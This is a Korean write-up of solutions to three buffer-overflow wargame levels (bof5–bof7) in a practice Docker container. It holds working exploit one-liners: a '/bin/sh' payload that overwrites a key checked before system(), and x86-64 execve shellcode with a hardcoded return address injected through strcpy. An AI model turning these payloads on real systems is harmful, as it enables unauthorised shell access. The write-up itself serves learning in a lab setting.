## ⚜️bof5 solution⚜️

이전 bof 문제들과 마찬가지로 bof4에서 얻은 패스워드로 bof5 유저로 접속한 뒤
bat bof5.c 명령어를 통해 bof5.c 파일의 구성을 보면
<img width="744" alt="스크린샷 2021-07-15 오후 6 26 40" src="https://user-images.githubusercontent.com/86994067/125765175-8285971b-d652-4452-ab9d-673c025e9722.png">

여기서 KEY 값은 0x12345678로 little endian 방식임을 알 수 있다.
여기서 주목할 점은 이전 문제들과는 달리 system 함수에서 인자를 받는 것이다.

<img width="742" alt="스크린샷 2021-07-15 오후 6 28 04" src="https://user-images.githubusercontent.com/86994067/125765734-518b0add-3a0b-44a0-b425-72823b3d35d6.png">
gdb disas vuln 명령어를 통해 vuln의 구성을 확인하고

<img width="748" alt="스크린샷 2021-07-15 오후 6 28 43" src="https://user-images.githubusercontent.com/86994067/125766057-1fdef0e7-e5ee-452e-ab38-a495a20188cb.png">
버퍼오버플로우를 걸어주는데 이때 생각해야하는 것이
system 함수에서 buf인자를 받은 형태인 것을 감안하여

(python -c "print '/bin/sh\x00'+'x'*132+'\x78\x56\x34\x12'";cat) | ./bof5
다음 명령어를 통해서 '/bin/sh\x00'을 추가하고 little endian 방식의 \x78\x56\x34\x12 키값을
넣어주어야 한다.

<br>

## ⚜️bof6 solution⚜️

bat 명령어를 통해 bof6.c의 구성을 확인해보면
<img width="954" alt="스크린샷 2021-07-16 오전 11 44 41" src="https://user-images.githubusercontent.com/86994067/125883821-6b60ef73-c434-40bc-9542-75f03b037775.png">

buf 사이즈가 128이고 64비트에서 SFP는 8바이트를 덮어줘야 하므로 buf와 return address까지의 거리가 136임을 알 수 있다.

<img width="1048" alt="스크린샷 2021-07-16 오전 11 43 15" src="https://user-images.githubusercontent.com/86994067/125887398-ec55459f-8577-40e0-97f3-f92908a4c4f7.png">

그 뒤에 쉘 코드 주소값을 덮어줄 때, ASLR이 적용되어 쉘 코드 주소값이 계속 바뀌는 문제가 있었는데
docker run -it --privileged ccss17/bof로 접속함으로써 해결할 수 있었다

<br>

## ⚜️bof7 solution⚜️

bof7.c의 구성을 보면

<img width="641" alt="스크린샷 2021-07-16 오후 1 19 58" src="https://user-images.githubusercontent.com/86994067/125891667-ab2bd317-4412-4d1d-937b-f6ab49c7d039.png">

취약점으로 strcpy 함수를 공략해야하는 것을 생각해볼 수 있다.

<img width="1104" alt="스크린샷 2021-07-16 오후 1 19 05" src="https://user-images.githubusercontent.com/86994067/125892981-bf7b7c5c-76e0-4e39-8d77-0cac76a17fee.png">

다음 사진을 보면 인자의 길이에 따라 주소값이 달라지는 것을 확인할 수 있다.
이때 buf와 return address의 거리가 136이고 8바이트의 주소값을 덮어씌어야 한다. (총 144바이트의 인자값을 전달해야함)

| 쉘 코드(buf) | 쓰레기 값(SFP) | 리턴 주소(RET) | 총 바이트 |
| :--: | :--: | :--: | :--: |
| 27 바이트 | 109 바이트 | 8 바이트 | 144바이트 |

다음 페이로드를 생각했을 때 익스플로잇을 시도해보면

<img width="1039" alt="스크린샷 2021-07-16 오후 1 22 12" src="https://user-images.githubusercontent.com/86994067/125894493-c18f274e-a29a-439b-b712-b78d82be5380.png">

``` shell
$ ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'x'*109 + '\xb0\xea\xff\xff\xff\x7f'"`
```
다음 코드를 통해 bof8의 패스워드를 얻을 수 있다.




